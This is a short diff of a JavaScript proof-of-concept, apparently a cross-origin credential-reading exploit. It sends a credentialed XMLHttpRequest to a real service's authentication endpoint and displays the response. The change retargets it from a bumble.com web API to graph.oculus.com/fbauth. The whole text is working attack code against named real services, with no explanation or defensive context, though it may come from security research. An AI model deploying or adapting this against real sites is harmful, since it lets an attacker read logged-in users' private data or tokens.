@@ -9,7 +9,7 @@
                         document.getElementById("demo").innerHTML = alert(this.responseText);
             }
          };
-         xhttp.open("GET", "https://bumble.com/mwebapi.phtml?SERVER_SUBMIT_EXTERNAL_PROVIDER", true);
+         xhttp.open("POST", "https://graph.oculus.com/fbauth", true);
          xhttp.withCredentials = true;
          xhttp.send();
          }
